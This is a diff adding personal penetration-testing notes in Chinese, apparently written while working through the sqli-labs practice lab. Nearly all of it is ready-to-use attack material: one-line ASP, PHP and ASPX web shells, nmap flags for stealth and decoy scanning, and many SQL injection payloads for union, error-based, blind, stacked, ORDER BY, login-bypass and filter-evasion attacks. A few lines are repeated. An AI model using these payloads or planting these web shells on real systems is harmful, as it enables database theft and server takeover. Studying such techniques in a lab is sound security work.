@@ -1,0 +1,109 @@
+一句话木马
+
+asp
+<%eval request("keio")%>
+
+php
+<?php @eval($_POST[hack]);?>
+
+aspx
+<%@ Page Language="Jscript"%> <%eval(Request.Item["hack"],"unsafe");%>
+
+
+nmap扫端口
+
+-s(
+T: 用的少 留下大量日志 ，但能使用TCP确定哪些主机在运行  
+S:用的多 需要root权限 基本不会记入日志，SYN 半开式扫描
+P:ping扫描
+R:RPC鉴别
+0:允许关闭icmp pings，不ping目标机
+A:ACK扫描，用于穿过防火墙
+)
+A:慢扫
+-p-:扫描全部端口 1-65535
+-p port:选择扫描的端口范围
+-g:选择源端口
+-vv:显示详细信息
+-D IP:伪造地址扫描
+-n:不用域名解析
+
+
+sql语句
+
+(select group_concat(schema_name) from information_schema.schemata) 查询信息表中数据库的个数
+
+(select group_concat(table_name) from information_schema.tables where table_schema='name') 查询某个数据库中的所有表名
+
+select group_concat(column_name) from information_schema.columns where table_name='name'  查询表中的所有列名
+
+(select group_concat(列名) from 数据库名.表名)
+
+sql闭合：
+数字型 ‘ 和 “ 都会报错；
+单引号型只有 ’ 会报错；
+双引号型只有 ” 会报错；
+
+报错注入：
+（1）通过floor报错
+?id=1' union select count(*),0,concat(0x3a,0x3a,(payloads),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,1--+  payload为插入语句，输出字符长度为64
+
+（2）通过updatexml报错
+爆库：1' and updatexml(1,concat(0x7e,database()),1)) #
+爆表：1' and updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1)),1))#
+爆字段：1' and updatexml(1,concat('~',(select column_name from information_schema.columns where table_name = 'users' limit 0,1)),1))#
+爆值：1' and updatexml(1,concat('~',(select username from users limit 0,1)),1))#
+
+limit 5 offset 4  //返回第五行
+
+# = and ' //看闭合方式
+
+
+（3）通过extractvalue报错
+同理
+1' and extractvalue(1,concat('~',database()))) #
+
+
+sql万能登陆语句（已修复漏洞）
+admin&passwd=1' or 1#&submit=Submit
+
+
+sql万能登陆语句
+admin&passwd=1' or 1#&submit=Submit
+' or 1='1
+
+update注入可用updatexml报错以及floor报错注入：如less-17（insert注入同理）
+uname=admin&passwd=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&submit=Submit
+
+uname=admin&passwd=qing' or updatexml(1,concat(0x7e,(version()),0x7e),0) or '&submit=Submit
+
+注意cookie、refer、user-agent处的漏洞注入（burpsuite完成）
+
+盲注：猜字段长度、字符匹配
+
+过滤了注释符号：用'1'='1闭合
+
+二次注入：构造语句让第一次注入时无害，第二次调用时能够影响数据库。（前提需要猜测数据库存储数据时的语句）
+
+过滤了and or可以用双写绕过：mysql特性，如oorr、anandd
+或者用十六进制以及大小写绕过
+过滤字符速查：https://www.shenn.top/article/284.html
+https://x.threatbook.cn/v5/article?threatInfoID=8389
+
+堆叠注入：mysqli_multi_query （$con1, $sql）函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。此函数本身就支持多个sql语句。
+?id=1';select <?php phpinfo();?>
+?id=1';select <?php phpinfo();?>
+原本的注入方式：mysql_query($sql);
+
+order by 注入：
+不同于where，order by后边不好用union获得数据，但是报错、布尔以及时延都可以用
+updatexm报错注入：
+?sort=1 and(updatexml(1,concat(0x7e,(select database())),0));
+?id=1'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(列名 )+AS+CHAR),0x7e))+FROM+表名+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+
+
+用rand（）来猜测数据库名称等，这种方法为布尔盲注：
+用rand（）来猜测数据库名称等，这种方法为布尔盲注：
+?sort=rand(left(database(),1)>'r')#猜测数据库第一位是否大于r，rand（1）和rand（0）的结果可以反映该情况
+
+闭合方式（盲注首先猜这个玩意儿）：
+")、'、‘）、)、"、）））多个括号加 “ 或者 ’
